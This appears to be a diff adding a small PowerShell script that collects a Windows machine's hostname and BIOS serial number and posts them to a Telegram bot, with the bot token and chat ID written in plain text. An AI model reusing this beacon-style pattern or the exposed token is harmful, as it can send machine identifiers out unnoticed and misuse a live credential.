@@ -1,0 +1,13 @@
+$SerialNumber = (Get-CimInstance Win32_BIOS).SerialNumber
+$Hostname = $env:COMPUTERNAME
+
+$BotToken = "7230575925:AAFZe8ScAv9gkit8QqppiqdD8cEIwwO5eyQ"
+$ChatID = "-1003661989048"
+$Uri = "https://api.telegram.org/bot$($BotToken)/sendMessage"
+
+$Body = @{
+    chat_id = $ChatID
+    text    = "$Hostname to $SerialNumber"
+}
+
+Invoke-RestMethod -Uri $Uri -Method Post -Body $Body
